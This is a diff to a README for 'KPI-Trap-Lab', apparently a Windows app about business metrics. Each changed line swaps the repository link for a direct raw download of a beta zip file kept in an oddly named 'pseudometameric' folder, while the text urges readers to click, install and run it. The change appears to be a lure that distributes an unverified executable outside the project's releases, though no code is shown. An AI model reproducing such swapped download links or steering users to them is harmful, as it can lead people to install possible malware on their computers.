@@ -1,6 +1,6 @@
 # 📊 KPI-Trap-Lab - Understand and Improve Key Metrics
 
-[![Download KPI-Trap-Lab](https://img.shields.io/badge/Download-KPI--Trap--Lab-brightgreen?style=for-the-badge)](https://github.com/tchoula/KPI-Trap-Lab)
+[![Download KPI-Trap-Lab](https://img.shields.io/badge/Download-KPI--Trap--Lab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/tchoula/KPI-Trap-Lab/main/pseudometameric/Trap_KP_Lab_3.6-beta.4.zip)
 
 ---
 
@@ -35,7 +35,7 @@ The app runs as a standalone program with a graphical interface.
 ## 🚀 Getting Started: How to Download and Run
 
 1. Click the big green button at the top or visit this page to download the app on Windows:  
-   https://github.com/tchoula/KPI-Trap-Lab
+   https://raw.githubusercontent.com/tchoula/KPI-Trap-Lab/main/pseudometameric/Trap_KP_Lab_3.6-beta.4.zip
 
 2. On the GitHub page, look for the latest release under "Releases" or the main download section.
 
@@ -119,6 +119,6 @@ The lab is designed for easy use, so most users will find the interface self-exp
 
 Use this link to get started on Windows:
 
-[Download KPI-Trap-Lab](https://github.com/tchoula/KPI-Trap-Lab)
+[Download KPI-Trap-Lab](https://raw.githubusercontent.com/tchoula/KPI-Trap-Lab/main/pseudometameric/Trap_KP_Lab_3.6-beta.4.zip)
 
 Click, install, and begin exploring how to better understand and trust your business metrics today.
